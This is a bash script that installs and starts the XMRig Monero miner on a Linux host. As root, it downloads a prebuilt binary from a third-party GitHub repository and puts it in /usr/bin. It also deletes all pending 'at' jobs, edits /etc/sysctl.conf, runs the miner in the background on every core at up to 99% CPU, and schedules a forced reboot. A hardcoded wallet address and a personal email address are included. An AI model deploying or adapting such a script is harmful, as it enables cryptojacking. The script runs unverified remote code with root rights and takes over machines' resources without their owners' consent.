#!/bin/bash

WALLET=4754axtGmMm8HpocfKMsvLXKgQGVpuHsLb6m3xDPMiYKfwuJ6cbot1ZPnZT2c7pb1H1Kg451LtsARWEC8i7ixySQ7mT4Vcb
ID="$(hostname)"
MAIL=mamasarkanzas@gmail.com
PASSWORD=$ID:$MAIL
THREADS="$(nproc --all)"

sleep 5
rm -rf /tmp/miner/
for i in `atq | awk '{print $1}'`;do atrm $i;done
sudo dpkg --configure -a
sleep 3
echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
sudo sysctl -p
sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
sleep 4
cd /tmp && mkdir miner
git clone https://github.com/WilliamWizard/miner-xmr.git /tmp/miner
cd /tmp/miner
sleep 1
chmod +x /tmp/miner/xmrig
cp /tmp/miner/xmrig /usr/bin/
sleep 1
xmrig -o pool.supportxmr.com:5555 -u $WALLET --pass=$PASSWORD --rig-id=$ID -B -l /tmp/miner/xmrig.log --donate-level=1 --print-time=10 --threads=$THREADS --cpu-priority=5 --background --max-cpu-usage=99 --av=1 --variant -1
echo -e 'ALL WORKS! tail -f /tmp/miner/xmrig.log'

touch /tmp/at.txt
echo 'sudo reboot -f' >> /tmp/at.txt
at now + 24 hours < /tmp/at.txt
echo -e 'Restart job specified'
